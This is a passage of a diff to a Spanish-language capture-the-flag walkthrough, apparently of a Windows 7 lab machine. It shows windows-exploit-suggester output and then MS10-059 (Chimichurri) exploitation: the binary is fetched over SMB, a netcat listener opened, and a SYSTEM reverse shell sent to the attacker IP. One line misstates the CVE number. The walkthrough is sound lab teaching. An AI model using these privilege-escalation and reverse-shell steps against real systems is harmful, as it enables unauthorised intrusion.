@@ -354,7 +354,7 @@ iis apppool\web
 
 ### Using windows-exploit-suggester to find paths to PrivEsc
 
-
+Una de las maneras de poder lograr disponer acceso como usuario `Administrator` es mediante la información del sistema. Para ello, a través del comando `systeminfo` logramos obtener la siguiente información del sistema, en la cual comprobamos que se trata de un `Windows 7 Enterprise`.
 
 ```bash
 c:\windows\system32\inetsrv>systeminfo
@@ -403,7 +403,11 @@ Network Card(s):           1 NIC(s) Installed.
                                  [04]: dead:beef::953e:ad94:9096:2ea3
 ```
 
+Nos copiaremos el contenido del `systeminfo` en nuestro equipo local en un archivo llamado `systeminfo.txt`.
 
+A través de la herramienta de `windows-exploit-suggester`, buscaremos alguna vía potencial para escalar nuestros privilegios en base al `systeminfo`que le hemos indicado.
+
+En el resultado obtenido, verificamos diferentes vulnerabilidades que se pueden realizar en el sistema.
 
 ```bash
 ❯ ls -l systeminfo.txt
@@ -413,11 +417,7 @@ Network Card(s):           1 NIC(s) Installed.
 [*] initiating winsploit version 3.3...
 [+] writing to file 2025-02-20-mssb.xls
 [*] done
-```
 
-
-
-```bash
 ❯ python2.7 /opt/windows-exploit-suggester/exploit -d 2025-02-20-mssb.xls -i systeminfo.txt
 [*] initiating winsploit version 3.3...
 [*] database file detected as xls or xlsx based on extension
@@ -446,13 +446,19 @@ Network Card(s):           1 NIC(s) Installed.
 [*] done
 ```
 
+### Exploitation MS10-059 - Tracing Feature for Services
 
+Después de revisar posibles vulnerabilidades que se nos han reportado, decidimos en optar en verificar si podíamos llegar a explotar la vulnerabilidad `MS10-059` reportada como `CVE-2020-2554`.
 
-### Exploitation MS10-059 - Tracing Feature for Services&#x20;
+{% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2010-2554" %}
+
+{% hint style="danger" %}
+El Tracing Feature for Services en Microsoft Windows Vista SP1 y SP2, Windows Server 2008 Gold, SP2, y R2, y Windows 7 tiene un ACLs incorrecto en su llave de registro, lo que permite a usuarios locales obtener privilegios a través de vectores que relacionan una tubería (pipe) y suplantación, conocido como "Vulnerabilidad de traza de llave de registro de ACL"
+{% endhint %}
+
+En el siguiente repositorio de GitHub, se nos proporcionan distintos exploits entre los cuales disponemos del `MS10-059`. El binario de `MS10-059.exe` (`Chimichurri.exe`) el cual compartiremos a través de un servidor `SMB` que nos montaremos en nuestro equipo.
 
 {% embed url="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059" %}
-
-
 
 ```bash
 ❯ ls -l MS10-059.exe
@@ -468,7 +474,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Config file parsed
 ```
 
-
+Desde el equipo víctima, copiaremos el binario en un directorio que dispongamos permisos de ejecución, como en este caso, el directorio `C:\ProgramData`.
 
 ```bash
 C:\ProgramData>copy \\10.10.16.3\smbFolder\MS10-059.exe C:\ProgramData\MS10-059.exe
@@ -488,7 +494,7 @@ dir
                1 Dir(s)   4.691.062.784 bytes free
 ```
 
-
+Ejecutaremos el binario de `MS10-059.exe` y comprobaremos el funcionamiento correcto de la aplicación. Al parecer, al ejecutar el binario e indicarle nuestra dirección IP y puerto, deberemos de recibir una Reverse Shell con permisos de `Administrator`.
 
 ```powershell
 C:\ProgramData>MS10-059.exe
@@ -496,14 +502,14 @@ MS10-059.exe
 /Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR>
 ```
 
-
+Nos pondremos en escucha con `nc` para recibir la Reverse Shell.
 
 ```bash
 ❯ rlwrap -cAr nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Ejecutaremos nuevamente el binario indicándole nuestra dirección y puerto donde nos encontramos en escucha.
 
 ```powershell
 C:\ProgramData>MS10-059.exe 10.10.16.3 443
@@ -511,7 +517,7 @@ MS10-059.exe 10.10.16.3 443
 /Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
 ```
 
-
+Verificamos que finalmente hemos podido ganar acceso al sistema como usuario `NT AUTHORITY\SYSTEM` y podemos visualizar las flags **user.txt** y **root.txt**.
 
 ```powershell
 ❯ rlwrap -cAr nc -nlvp 443
@@ -526,9 +532,9 @@ nt authority\system
 
 C:\ProgramData>type C:\Users\babis\Desktop\user.txt
 type C:\Users\babis\Desktop\user.txt
-0a94ba0b08ffe24702e918d7c932b034
+0a94ba0*************************
 
 C:\ProgramData>type C:\Users\Administrator\Desktop\root.txt
 type C:\Users\Administrator\Desktop\root.txt
-2a3a25e84a54dc5ebdf8b5e83f282c73
+2a3a25e*************************
 ```
